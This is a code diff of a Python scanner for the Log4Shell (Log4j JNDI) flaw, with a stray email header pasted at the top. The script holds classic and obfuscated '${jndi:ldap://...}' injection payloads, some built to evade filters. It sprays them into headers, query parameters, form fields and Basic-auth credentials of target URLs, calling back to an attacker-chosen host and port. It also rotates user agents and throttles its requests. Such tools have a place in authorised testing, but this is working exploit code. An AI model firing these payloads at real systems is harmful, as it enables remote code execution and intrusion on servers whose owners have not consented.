@@ -1,3 +1,8 @@
+
+Julien GARAVET
+13:26 (il y a 1 minute)
+À moi
+
 #!/usr/bin/env python3
 import argparse, base64, random, requests, string, sys, time, urllib3
 from bs4 import BeautifulSoup
@@ -5,11 +10,11 @@ from datetime import datetime
 from termcolor import cprint
 from urllib.parse import urljoin
 
-TIMEOUT = 3
+TIMEOUT = 5
 WAIT_MIN = 500000
 WAIT_RAND_MAX = 600000
 
-HEADER_UA = {'1': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36', 
+HEADER_UA = {'1': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
              '2': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
              '3': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
              '4': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
@@ -33,7 +38,7 @@ HEADER_CLASSIC = {'Accept': '*/*',
 
 PAYLOAD_CLASSIC = ['${jndi:ldap://{{EVIL}}:{{PORT}}/a}', '${jndi:ldap://127.0.0.1#{{EVIL}}:{{PORT}}/a}']
 PAYLOAD_NASTY = ['${${lower:jndi}:${lower:ldap}://{{EVIL}}:{{PORT}}/a}',
-                 '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{EVIL}}:{{PORT}}/a}', 
+                 '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{EVIL}}:{{PORT}}/a}',
                  '${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{EVIL}}:{{PORT}}/a}',
                  '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//{{EVIL}}:{{PORT}}/a}',
                  '${${sys:SYS_NAME:-j}ndi${sys:SYS_NAME:-:}${sys:SYS_NAME:-l}dap${sys:SYS_NAME:-:}//{{EVIL}}:{{PORT}}/a}',
@@ -51,7 +56,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def crawler_add2queue(path, url, queue):
   if path.startswith(url) and path not in queue:
     queue.append(path)
-    #cprint(f'[!]   -> {path}', 'cyan') 
+    #cprint(f'[!]   -> {path}', 'cyan')
 
 
 ###
@@ -123,7 +128,7 @@ def get_headers(header, payload):
   return headers
 
 
-### 
+###
 def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload):
   payloads = get_payloads(_payload, _evil_site, _evil_port, _callback)
   max_payloads = len(payloads)
@@ -135,7 +140,7 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
     soup = BeautifulSoup(response.content, 'html.parser')
   except:
     cprint('[!] FATAL: the given URL is not reachable', 'red', attrs=['bold'])
-    return 
+    return
 
   cprint(f'[!]   -> HTTP Code {response.status_code}', 'cyan')
 
@@ -148,7 +153,7 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
     if _method == 'get' or _method == 'both':
       headers = get_headers(_header, payload)
       if _param == 'none':
-        requests.request(url=_url, method='GET', headers=headers, verify=False, timeout=TIMEOUT)
+        requests.request(url=_url, method='GET', headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
       elif _param == 'classic':
         requests.request(url=_url, method='GET', params={"q": payload}, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
       time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
@@ -156,8 +161,9 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
     # _method = post
     if _method == 'post' or _method == 'both':
       headers = get_headers(_header, payload)
-   
+
       if response.status_code == 401:
+        headers = {}
         creds = payload + ':' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
         creds = creds.encode('ascii')
         creds64_b = base64.b64encode(creds)
@@ -167,14 +173,20 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
 
         time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
         cpt_payloads = cpt_payloads + 1
-        continue 
+        continue
 
       try:
         soup_inputs = soup.find_all('input')
         soup_action = soup.form['action']
         url = _url + soup_action
       except:
-        cprint('[!]      Can\'t use POST method: did not find any form to post', 'magenta')
+        cprint('[!]      Can\'t use POST method so using GET: did not find any form to post', 'magenta')
+        headers = {}
+        if _param == 'none':
+          requests.request(url=_url, method='GET', headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+        elif _param == 'classic':
+          requests.request(url=_url, method='GET', params={"q": payload}, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
+        time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
         continue
 
       inputs = []
@@ -186,16 +198,16 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
       data = {}
       for val in inputs:
         data.update({val: payload})
- 
+
       try:
         if _param == 'none':
           requests.request(url=url, method='POST', headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
         elif _param == 'classic':
           requests.request(url=url, method='POST', params={'q': payload}, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
         time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
-      except Exception as e:
+      except:
         cprint('[!] Potential vulnerability found: true positive or network blocking (check out in Active/Passive Callback Modules logs)', 'red', attrs=['bold'])
-      
+
       # _data = extended
       if _data == 'extended':
         for val in inputs:
@@ -212,16 +224,16 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
             elif _param == 'classic':
               requests.request(url=url, method='POST', params={'r': payload}, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
             time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
-          except Exception as e:
+          except:
             cprint('[!] Potential vulnerability found: true positive or network blocking (check out in Active/Passive Callback Modules logs)', 'red', attrs=['bold'])
     cpt_payloads = cpt_payloads + 1
 
-### 
+###
 def main():
   if len(sys.argv) <= 1:
     print('\n%s -h for help.' % (sys.argv[0]))
     exit(0)
-  
+
   parser = argparse.ArgumentParser()
   parser.add_argument('--url', action='store', dest='url', required=True, help='URL or file with URL to scan')
   parser.add_argument('--evil_site', action='store', dest='evilsite', required=True, help='IP or FQDN for the callback')
@@ -274,7 +286,7 @@ def main():
 　　　　　　　　　　　 /　/|　　　　　　　  |　|　|　|
 　　　　　　　　　　　 ◎ ( ◎＼　　　　　     ◎　    ◎
 　　　　　　　　　　　|　|　＼＼　　　　 　 |　|　 |　|
-                      |　|  |　|            |  |   |　| 
+                      |　|  |　|            |  |   |　|
 　　　  　　　　　　　<00>　<00>　　        <00>   <00>"""
     cprint(tmp, 'green')
     print('')
